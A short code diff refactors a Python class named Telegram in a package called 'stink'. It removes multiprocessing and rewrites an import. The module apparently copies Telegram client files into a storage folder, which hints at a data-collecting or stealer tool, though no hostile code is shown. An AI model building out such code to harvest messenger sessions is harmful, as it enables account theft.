@@ -1,15 +1,13 @@
 from re import findall
 from shutil import copyfile
-from multiprocessing import Process
 from os import listdir, path, makedirs
 
-from ..helpers.config import TelegramConfig
+from stink.helpers.config import TelegramConfig
 
 
-class Telegram(Process):
+class Telegram:
 
     def __init__(self, storage_path: str, folder: str, errors: bool):
-        Process.__init__(self)
 
         self.config = TelegramConfig()
         self.storage_path = storage_path
